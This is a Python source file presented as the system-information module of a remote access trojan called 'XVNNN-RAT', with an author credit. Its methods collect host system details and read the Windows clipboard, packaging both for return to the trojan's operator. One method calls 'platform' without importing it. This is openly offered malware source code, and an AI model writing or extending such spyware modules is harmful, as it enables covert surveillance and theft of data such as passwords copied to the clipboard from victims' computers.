"""
System info module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import logging
from utils.system import get_system_info

logger = logging.getLogger(__name__)

class SystemInfoModule:
    """System information gathering module"""
    
    def __init__(self):
        self.name = "systeminfo"
    
    def get_info(self):
        """Get system information"""
        try:
            info = get_system_info()
            return {'type': 'system_info', 'info': info}
        except Exception as e:
            logger.error(f"System info error: {e}")
            return {'type': 'system_info', 'error': str(e)}
    
    def get_clipboard(self):
        """Get clipboard content"""
        try:
            if platform.system() == 'Windows':
                try:
                    import win32clipboard
                    win32clipboard.OpenClipboard()
                    content = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                except:
                    content = "[Clipboard access denied]"
            else:
                content = "[Clipboard access requires additional setup]"
            
            return {'type': 'clipboard', 'content': content}
        except Exception as e:
            logger.error(f"Clipboard error: {e}")
            return {'type': 'clipboard', 'error': str(e)}